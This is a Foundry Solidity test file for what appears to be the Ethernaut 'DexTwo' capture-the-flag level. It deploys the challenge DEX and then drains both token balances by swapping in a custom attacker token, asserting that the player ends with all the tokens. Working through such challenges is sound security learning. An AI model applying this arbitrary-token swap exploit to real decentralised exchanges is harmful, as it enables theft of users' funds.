// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "forge-std/Test.sol";
import "instances/23_DexTwo.sol";
import "contracts/23_DexTwo.sol";

contract AttackerDexTwoTest is Test {
    DexTwo dexTwo;
    SwappableTokenTwo token1;
    SwappableTokenTwo token2;
    AttackerDexTwo tokenAttacker;
    address owner = makeAddr("owner");
    address player = makeAddr("player");

    function testDexTwo() external {
        vm.prank(owner);
        dexTwo = new DexTwo();

        vm.startPrank(address(dexTwo));
        token1 = new SwappableTokenTwo(address(dexTwo), "Token1", "TOK1", 100);
        token2 = new SwappableTokenTwo(address(dexTwo), "Token2", "TOK2", 100);
        tokenAttacker = new AttackerDexTwo();
        token1.transfer(player, 10);
        token2.transfer(player, 10);
        vm.stopPrank();

        vm.prank(owner);
        dexTwo.setTokens(address(token1), address(token2));

        vm.startPrank(player);
        dexTwo.approve(address(dexTwo), 100);
        dexTwo.swap(address(tokenAttacker), address(token1), 1);
        dexTwo.swap(address(tokenAttacker), address(token2), 1);
        assertEq(token1.balanceOf(address(dexTwo)), 0);
        assertEq(token2.balanceOf(address(dexTwo)), 0);
        assertEq(token1.balanceOf(player), 100);
        assertEq(token2.balanceOf(player), 100);
    }
}
